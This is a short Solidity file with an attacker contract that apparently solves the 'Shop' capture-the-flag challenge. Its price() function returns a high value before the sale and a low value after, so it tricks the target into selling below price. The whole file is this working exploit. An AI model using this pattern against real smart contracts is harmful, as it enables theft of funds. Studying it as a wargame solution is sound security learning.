// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

abstract contract IShop {
    uint256 public price;
    bool public isSold;

    function buy() external virtual;
}

contract ShopAttacker {
    IShop public shop;

    constructor(address _shopAddress) public {
        shop = IShop(_shopAddress);
    }

    function attack() public {
        shop.buy();
    }

    function price() external view returns (uint256) {
        if (!shop.isSold()) {
            return 110;
        } else {
            return 1;
        }
    }
}
